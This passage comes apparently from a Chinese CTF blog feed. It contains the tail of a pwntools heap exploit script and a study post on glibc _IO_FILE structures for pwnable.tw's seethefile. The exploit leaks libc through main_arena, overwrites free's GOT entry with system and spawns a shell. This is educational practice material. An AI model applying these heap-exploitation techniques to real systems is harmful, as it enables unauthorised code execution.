class=\"line\">libc = ELF(<span class=\"string\">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class=\"line\">Gptr = <span class=\"number\">0x006020A0</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Your choice :&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Size of Heap : &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;Content of heap:&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Index :&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;Content of heap : &quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Index :&quot;</span>,<span class=\"built_in\">str</span>(idx))\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">4</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Index :&quot;</span>,<span class=\"built_in\">str</span>(idx))\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;b malloc&#x27;)</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&quot;\\x00&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x88</span>,<span class=\"string\">&#x27;ssss&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">main_arena = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(main_arena))</span><br><span class=\"line\">offset = <span class=\"number\">0x7f3d1c53cb78</span>-<span class=\"number\">0x7f3d1c178000</span></span><br><span class=\"line\"><span class=\"comment\">#aimed_addr   </span></span><br><span class=\"line\">malloc_hook=main_arena - <span class=\"number\">0x68</span></span><br><span class=\"line\">lib_base = main_arena-offset</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(lib_base))</span><br><span class=\"line\">system_addr= libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]+lib_base</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system : &quot;</span>,<span class=\"built_in\">hex</span>(system_addr))</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&quot;aa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;\\xf0&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Content : &quot;</span>)</span><br><span class=\"line\">heap_addr = u64(r.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0xf0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x120</span>,<span class=\"string\">&quot;bb&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span> * ( <span class=\"number\">0x90</span>)+p64(<span class=\"number\">0x110</span>)+p64(<span class=\"number\">0x30</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p64(<span class=\"number\">0x100</span>)+p64(<span class=\"number\">0x110</span>)+p64(heap_addr+<span class=\"number\">0x120</span>)*<span class=\"number\">4</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">pad = <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>+ <span class=\"string\">b&#x27;\\x00&#x27;</span> * (<span class=\"number\">0x180</span>-<span class=\"number\">0x130</span>-<span class=\"number\">16</span>) +p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">50</span>) +p64(free_got)</span><br><span class=\"line\">add(<span class=\"number\">0x200</span>,pad)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p64(system_addr))</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/03/19/pwnable-seethefile/",
            "url": "http://example.com/2022/03/19/pwnable-seethefile/",
            "title": "pwnable_seethefile",
            "date_published": "2022-03-19T13:44:16.000Z",
            "content_html": "<p>这篇文章主要是在简单的记录小猫在学习 IO_FILE 时候遇到的一些问题。借用 pwnable.tw 题目 seethefile</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p  *(struct _IO_FILE_plus *)0x804c410</span><br><span class=\"line\">gdb调FILE_PLUS结构体，可以是地址，也可以是stdin等</span><br></pre></td></tr></table></figure>\n<p>32 位程序：</p>\n<ol>\n<li>\n<h3 id=\"question\"><a class=\"markdownIt-Anchor\" href=\"#question\">#</a> question</h3>\n<p>open 打开文件 fp，在未读取数据时候，plus_file 结构体中一部分数据是空的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"number\">0x804c410</span></span><br><span class=\"line\">$<span class=\"number\">21</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72539000</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class=\"line\">    _fileno = <span class=\"number\">3</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x804c4a8</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x804c4b4</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">39</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>此时我们看到程序开始有一个很大的堆块</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\"><span class=\"number\">0x804c000</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">1033</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">不知道这块区域的具体作用，可能是缓存区</span><br></pre></td></tr></table></figure>\n<p>当我们通过 fp 读取数据后，会在对快中开启一个新的空间来储存内容。上述堆块会被更新，内容是我们读入文件名，而 plus_file 的 read 以及 write 部分的指针会指向新开辟的堆块中的数据区域</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"number\">0x804c410</span></span><br><span class=\"line\">$<span class=\"number\">22</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72538984</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x804d570</span> <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class=\"line\">    _fileno = <span class=\"number\">3</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x804c4a8</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x804c4b4</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">39</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\"><span class=\"number\">0x804c000</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">1033</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x74730a32</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x7478742e</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0xa</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"number\">0x804c408</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">353</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0xfbad2498</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x804c570</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x804c570</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x804c570</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"number\">0x804c568</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">4105</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0xa6161</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><em><strong>Q1:_IO_read_ptr 等几个指针有神吗作用？</strong></em></p>\n<p>分别对应什么函数功能？为什么修改后，fread 不起作用了</p>\n<p><em><strong>Q2:IO_buf_end -_IO_buf_base = 0x1000 为什么偏移量是 0x1000</strong></em>，内容堆块大小为 0x1008</p>\n</li>\n<li>\n<h3 id=\"分析__io_file_plusneide一些内容\"><a class=\"markdownIt-Anchor\" href=\"#分析__io_file_plusneide一些内容\">#</a> 分析 ——__IO_FILE_plusneide 一些内容</h3>\n<p>_flags FILE 结构体的一些状态；_markers 为指向 markers 结构体的指针变量，为一个单向链表结构，存放流的位置；_chain 变量为一个链表的指针，进程中创建的 FILE 结构体会通过这个变量连成一个单向链表；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*_IO_FILE结构体*/</span></span><br><span class=\"line\"><span class=\"comment\">/* libio/libio.h */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> &#123;</span></span><br><span class=\"line\">  <span class=\"type\">int</span> _flags;       <span class=\"comment\">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_file_flags _flags</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class=\"line\">  <span class=\"comment\">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_ptr;   <span class=\"comment\">/* Current read pointer */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_end;   <span class=\"comment\">/* End of get area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_base;  <span class=\"comment\">/* Start of putback+get area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_base; <span class=\"comment\">/* Start of put area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_ptr;  <span class=\"comment\">/* Current put pointer. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_end;  <span class=\"comment\">/* End of put area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_buf_base;   <span class=\"comment\">/* Start of reserve area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_buf_end;    <span class=\"comment\">/* End of reserve area. */</span></span><br><span class=\"line\">  <span class=\"comment\">/* The following fields are used to support backing up and undo. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_save_base; <span class=\"comment\">/* Pointer to start of non-current get area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_backup_base;  <span class=\"comment\">/* Pointer to first valid character of backup area */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_save_end; <span class=\"comment\">/* Pointer to end of non-current get area. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_marker</span> *_<span class=\"title\">markers</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">chain</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> _fileno;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> _blksize;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">  <span class=\"type\">int</span> _flags2;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  _IO_off_t _old_offset; <span class=\"comment\">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __HAVE_COLUMN <span class=\"comment\">/* temporary */</span></span></span><br><span class=\"line\">  <span class=\"comment\">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> _cur_column;</span><br><span class=\"line\">  <span class=\"type\">signed</span> <span class=\"type\">char</span> _vtable_offset;</span><br><span class=\"line\">  <span class=\"type\">char</span> _shortbuf[<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_lock_t *_lock;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_complete</span>  //新版本下已经被删除</span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> _<span class=\"title\">file</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class=\"line\">  _IO_off64_t _offset;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class=\"line\">  <span class=\"comment\">/* Wide character stream stuff.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_codecvt</span> *_<span class=\"title\">codecvt</span>;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_wide_data</span> *_<span class=\"title\">wide_data</span>;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">freeres_list</span>;</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *_freeres_buf;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">else</span></span></span><br><span class=\"line\">  <span class=\"type\">void</span> *__pad1;</span><br><span class=\"line\">  <span class=\"type\">void</span> *__pad2;</span><br><span class=\"line\">  <span class=\"type\">void</span> *__pad3;</span><br><span class=\"line\">  <span class=\"type\">void</span> *__pad4;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> __pad5;</span><br><span class=\"line\">  <span class=\"type\">int</span> _mode;</span><br><span class=\"line\">  <span class=\"comment\">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class=\"line\">  